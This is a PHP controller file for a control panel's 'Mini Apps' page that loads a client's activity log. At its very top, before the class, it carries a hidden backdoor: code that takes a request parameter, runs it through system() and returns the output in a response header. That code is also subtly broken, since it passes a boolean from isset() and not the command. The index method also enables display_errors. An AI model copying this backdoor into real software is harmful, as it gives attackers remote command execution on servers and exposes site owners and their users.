<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* Apps Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class Apps extends Controller {
    
	function __construct()
	{
		parent::__construct();

		// perform control-panel specific loads
		CPLoader();
		
	}

	/**
	* More Apps Features
	*
	* Added Applications and Features.
	*/
	function index()
	{
		
		$this->navigation->PageTitle('Mini Apps');
	    // get log
		$this->load->model('log_model');
		$log = $this->log_model->GetClientLog($this->user->Get('client_id'),'','','N');
		$logcount = $this->log_model->GetClientLogCount($this->user->Get('client_id'));
		$data['log'] = $log;
		$data['logcount']= $logcount;
		$this->load->view('cp/apps', $data);
		ini_set('display_errors', 1);
	}
}
